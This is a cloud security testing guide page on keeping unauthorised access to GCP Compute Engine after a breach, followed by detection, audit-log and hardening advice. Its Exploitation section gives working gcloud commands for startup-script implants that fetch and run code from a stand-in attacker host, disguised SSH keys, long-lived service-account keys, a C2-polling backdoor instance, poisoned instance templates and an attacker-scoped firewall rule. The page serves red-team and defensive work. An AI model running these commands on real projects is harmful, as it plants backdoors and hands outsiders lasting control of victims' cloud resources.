---
cstg_id: CSTG-GCP-COMPUTE-ENGINE-PERSIST
title: "GCP Compute Engine - Persistence"
provider: gcp
service: compute-engine
phase: persistence
required_access: assumed-breach
required_permissions:
  - compute.instances.setMetadata
  - compute.projects.setCommonInstanceMetadata
  - compute.instances.create
  - compute.instances.setServiceAccount
  - compute.instances.setIamPolicy
  - iam.serviceAccounts.actAs
  - iam.serviceAccountKeys.create
  - compute.firewalls.create
  - compute.networks.create
  - compute.instanceTemplates.create
  - compute.instanceGroupManagers.create
tools: [gcloud, gcp-rest-api, jq, ssh-keygen]
references:
  - "https://cloud.google.com/compute/docs/metadata/setting-custom-metadata"
  - "https://cloud.google.com/compute/docs/instances/startup-scripts"
  - "https://cloud.google.com/iam/docs/keys-create-delete"
  - "https://cloud.google.com/compute/docs/instance-groups"
  - "https://cloud.google.com/compute/docs/connect/add-ssh-keys"
  - "https://cloud.google.com/vpc/docs/firewalls"
license: CC BY-SA 4.0
---

## Summary

Persistence in Compute Engine is the establishment of durable access that survives reboots, credential rotation, instance recreation, and routine remediation. GCE offers a rich set of persistence surfaces because instance behavior is driven by mutable metadata (startup/shutdown scripts and SSH keys), because instances carry service-account identities, and because managed instance groups recreate instances from templates an operator controls.

The objective is to retain re-entry into both the operating system layer (shells on instances) and the cloud control plane (valid credentials/identities), ideally in ways that blend into legitimate automation. This page catalogs the durable mechanisms and how each one re-grants access.

## Prerequisites

- An authenticated principal (assumed breach) with the relevant Compute and/or IAM permissions listed in the frontmatter.
- For service-account-based persistence, `iam.serviceAccounts.actAs` on the target SA and/or `iam.serviceAccountKeys.create`.

## Exploitation

### Startup / shutdown script implants (compute.instances.setMetadata)

The `startup-script` metadata key runs as root on every boot; `shutdown-script` runs on stop. Implanting a beacon or reverse-key installer here persists across reboots and is re-applied automatically.

```bash
gcloud compute instances add-metadata <NAME> --zone <ZONE> \
  --metadata startup-script='#!/bin/bash
    # reinstall access on every boot
    echo "op:$(cat /opt/.k.pub 2>/dev/null)" >> /root/.ssh/authorized_keys
    (curl -s https://attacker.example/b.sh | bash) &'
```

Project-wide variants apply to every instance and every newly created instance:

```bash
gcloud compute project-info add-metadata \
  --metadata startup-script='#!/bin/bash
    nohup /usr/bin/persistent-agent &'
```

### Persistent SSH keys in metadata (compute.projects.setCommonInstanceMetadata)

Adding an attacker key to project-wide `ssh-keys` grants login to every instance that does not block project keys, and to all future instances.

```bash
ssh-keygen -t ed25519 -f ./persist -N ''
gcloud compute project-info add-metadata \
  --metadata "ssh-keys=svc-backup:$(cat ./persist.pub)"   # name chosen to look benign
```

### Service-account key creation (iam.serviceAccountKeys.create)

User-managed service-account keys are long-lived JSON credentials that survive password resets, SSO changes, and most session revocations. A key minted for a privileged SA is durable, portable control-plane access usable from anywhere.

```bash
gcloud iam service-accounts keys create persist-key.json \
  --iam-account <TARGET_SA>@<PROJECT>.iam.gserviceaccount.com
# Authenticate from any machine, indefinitely:
gcloud auth activate-service-account --key-file persist-key.json
```

### Backdoor instance with privileged SA (compute.instances.create + actAs)

Create an unobtrusively named instance attached to a privileged service account with full scope; its metadata token is always available for re-entry.

```bash
gcloud compute instances create logging-agent-3 \
  --zone us-central1-a --machine-type e2-micro \
  --image-family debian-12 --image-project debian-cloud \
  --service-account <PRIV_SA>@<PROJECT>.iam.gserviceaccount.com \
  --scopes cloud-platform \
  --no-address \
  --metadata startup-script='#!/bin/bash
    (while true; do curl -s https://attacker.example/c2 | bash; sleep 3600; done) &'
```

### Managed instance group / template persistence

A poisoned instance template used by a managed instance group (MIG) reintroduces the implant every time the MIG heals or scales - so deleting a single compromised VM does not remove access.

```bash
gcloud compute instance-templates create app-tmpl-v2 \
  --image-family debian-12 --image-project debian-cloud \
  --service-account <PRIV_SA>@<PROJECT>.iam.gserviceaccount.com --scopes cloud-platform \
  --metadata startup-script='#!/bin/bash
    /usr/bin/persistent-agent &'
gcloud compute instance-groups managed set-instance-template <MIG> --template app-tmpl-v2 --zone <ZONE>
gcloud compute instance-groups managed rolling-action replace <MIG> --zone <ZONE>
```

### Instance-level IAM binding (compute.instances.setIamPolicy)

Grant a controlled principal an OS Login admin role or instance-admin role directly on an instance, providing a standing re-entry path independent of project-level role changes.

```bash
gcloud compute instances add-iam-policy-binding <NAME> --zone <ZONE> \
  --member='serviceAccount:<CONTROLLED_SA>@<PROJECT>.iam.gserviceaccount.com' \
  --role='roles/compute.osAdminLogin'
```

### Firewall / network re-entry (compute.firewalls.create)

Open a quiet ingress rule (e.g., a high port from a specific source range) scoped by a target tag, restoring network reachability to implanted instances even after broader cleanup.

```bash
gcloud compute firewall-rules create allow-mgmt-9022 \
  --direction=INGRESS --action=ALLOW --rules=tcp:9022 \
  --source-ranges=<ATTACKER_CIDR> --target-tags=mgmt
```

## Misconfigurations & Findings

- Persistent startup/shutdown scripts containing unexplained network callouts or key installers.
- Project-wide SSH keys with innocuous names that do not map to a known operator.
- User-managed service-account keys (long-lived) on privileged SAs - these should be rare and tracked.
- Backdoor instances named to mimic agents/loggers; instances with `cloud-platform` scope and no business owner.
- Instance templates / MIGs that reintroduce implants on heal/scale.
- Narrow, oddly named firewall rules from external CIDRs.

## Detection & Logging

- **Cloud Audit Logs - Admin Activity** record every persistence action: `v1.compute.instances.setMetadata`, `v1.compute.projects.setCommonInstanceMetadata`, `v1.compute.instances.insert`, `v1.compute.instances.setIamPolicy`, `v1.compute.firewalls.insert`, `compute.instanceTemplates.insert`, and the IAM event `google.iam.admin.v1.CreateServiceAccountKey`. Alert specifically on service-account key creation and on `setCommonInstanceMetadata` modifying `ssh-keys` or `startup-script`.
- Compare current project/instance metadata against a known-good baseline to detect implanted scripts and keys.
- A new instance attached to a privileged SA, or a template/MIG change, by an unusual principal is high-signal.
- **VPC Flow Logs** and **Firewall Rules Logging** reveal traffic enabled by attacker-created rules.
- **Security Command Center** flags newly created service-account keys, anomalous firewall rules, and Event Threat Detection persistence patterns.

## Remediation & Hardening

- Disable user-managed service-account key creation via the org policy `iam.disableServiceAccountKeyCreation`; prefer short-lived credentials and Workload Identity.
- Enforce OS Login and block project SSH keys to neutralize metadata-key persistence; review project/instance metadata regularly against baseline.
- Restrict `setMetadata`, `setCommonInstanceMetadata`, `setServiceAccount`, `setIamPolicy`, instance/template creation, and firewall creation to a small admin set; alert on each.
- Use infrastructure-as-code with drift detection so unauthorized instances, templates, MIGs, and firewall rules are flagged and reverted.
- Rotate and review service-account keys; revoke unknown keys immediately and rebuild affected workloads.
- Constrain SA usage with IAM Conditions and VPC Service Controls so even a leaked key has limited reach.

## Tools

- Cloud CLI and raw REST for creating and inspecting the persistence mechanisms.
- Configuration/drift baselines and audit-log queries for detecting implanted metadata, keys, instances, and rules.

## References

- Setting custom metadata: https://cloud.google.com/compute/docs/metadata/setting-custom-metadata
- Startup scripts: https://cloud.google.com/compute/docs/instances/startup-scripts
- Creating/deleting SA keys: https://cloud.google.com/iam/docs/keys-create-delete
- Instance groups: https://cloud.google.com/compute/docs/instance-groups
- Adding SSH keys: https://cloud.google.com/compute/docs/connect/add-ssh-keys
- VPC firewall rules: https://cloud.google.com/vpc/docs/firewalls
